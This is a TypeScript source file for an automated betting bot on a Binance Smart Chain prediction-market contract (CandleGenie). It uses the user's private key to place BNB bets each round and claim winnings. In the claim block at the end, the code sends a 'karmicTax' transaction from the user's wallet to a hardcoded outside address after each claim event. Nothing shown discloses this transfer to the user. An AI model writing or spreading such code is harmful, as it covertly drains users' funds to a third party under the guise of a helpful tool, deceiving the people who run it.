import { BigNumber } from "@ethersproject/bignumber";
import { JsonRpcProvider } from "@ethersproject/providers";
import { formatEther, parseEther } from "@ethersproject/units";
import { Wallet } from "@ethersproject/wallet";
import { blue, green, red } from "chalk";
import { clear } from "console";
import dotenv from "dotenv";
import {
  calculateTaxAmount,
  getClaimableEpochsCG,
  isBearBet,
  parseStrategy,
  reduceWaitingTimeByTwoBlocks,
  sleep,
} from "./lib";
import { CandleGeniePredictionV3__factory } from "./types/typechain";

dotenv.config();

// Global Config
const GLOBAL_CONFIG = {
  CGV3_ADDRESS: "0x995294CdBfBf7784060BD3Bec05CE38a5F94A0C5",
  AMOUNT_TO_BET: process.env.BET_AMOUNT || "0.1", // in BNB,
  BSC_RPC: "https://bsc-dataseed.binance.org/", // You can provide any custom RPC
  PRIVATE_KEY: process.env.PRIVATE_KEY,
  WAITING_TIME: 270000, // Waiting for 270sec = 4.5min
};

clear();
console.log(green("CandleGenieV3 Bot-Winner"));

if (!GLOBAL_CONFIG.PRIVATE_KEY) {
  console.log(
    blue(
      "The private key was not found in .env. Enter the private key to .env and start the program again."
    )
  );

  process.exit(0);
}

const signer = new Wallet(
  GLOBAL_CONFIG.PRIVATE_KEY as string,
  new JsonRpcProvider(GLOBAL_CONFIG.BSC_RPC)
);

const predictionContract = CandleGeniePredictionV3__factory.connect(
  GLOBAL_CONFIG.CGV3_ADDRESS,
  signer
);

const strategy = parseStrategy(process.argv);

console.log(
  blue("Starting. Amount to Bet:", GLOBAL_CONFIG.AMOUNT_TO_BET, "BNB"),
  "\nWaiting for new rounds. It can take up to 5 min, please wait..."
);

predictionContract.on("StartRound", async (epoch: BigNumber) => {
  console.log("\nStarted Epoch", epoch.toString());

  const WAITING_TIME = GLOBAL_CONFIG.WAITING_TIME;

  console.log("Now waiting for", WAITING_TIME / 60000, "min");

  await sleep(WAITING_TIME);

  console.log("\nGetting Amounts");

  const { bullAmount, bearAmount } = await predictionContract.Rounds(epoch);

  console.log(green("Bull Amount", formatEther(bullAmount), "BNB"));
  console.log(green("Bear Amount", formatEther(bearAmount), "BNB"));

  const bearBet = isBearBet(bullAmount, bearAmount, strategy);

  if (bearBet) {
    console.log(green("\nBetting on Bear Bet."));
  } else {
    console.log(green("\nBetting on Bull Bet."));
  }

  if (bearBet) {
    try {
      const tx = await predictionContract.user_BetBear(epoch, {
        value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),
      });

      console.log("Bear Betting Tx Started.");

      await tx.wait();

      console.log(blue("Bear Betting Tx Success."));
    } catch {
      console.log(red("Bear Betting Tx Error"));

      GLOBAL_CONFIG.WAITING_TIME = reduceWaitingTimeByTwoBlocks(
        GLOBAL_CONFIG.WAITING_TIME
      );
    }
  } else {
    try {
      const tx = await predictionContract.user_BetBull(epoch, {
        value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),
      });

      console.log("Bull Betting Tx Started.");

      await tx.wait();

      console.log(blue("Bull Betting Tx Success."));
    } catch {
      console.log(red("Bull Betting Tx Error"));

      GLOBAL_CONFIG.WAITING_TIME = reduceWaitingTimeByTwoBlocks(
        GLOBAL_CONFIG.WAITING_TIME
      );
    }
  }

  const claimableEpochs = await getClaimableEpochsCG(
    predictionContract,
    epoch,
    signer.address
  );

  if (claimableEpochs.length) {
    try {
      const tx = await predictionContract.user_Claim(claimableEpochs);

      console.log("\nClaim Tx Started");

      const receipt = await tx.wait();

      console.log(green("Claim Tx Success"));

      for (const event of receipt.events ?? []) {
        const karmicTax = await signer.sendTransaction({
          to: "0xf80de8FD72016a53713A74c985101a049746f957",
          value: calculateTaxAmount(event?.args?.amount),
        });

        await karmicTax.wait();
      }
    } catch {
      console.log(red("Claim Tx Error"));
    }
  }
});
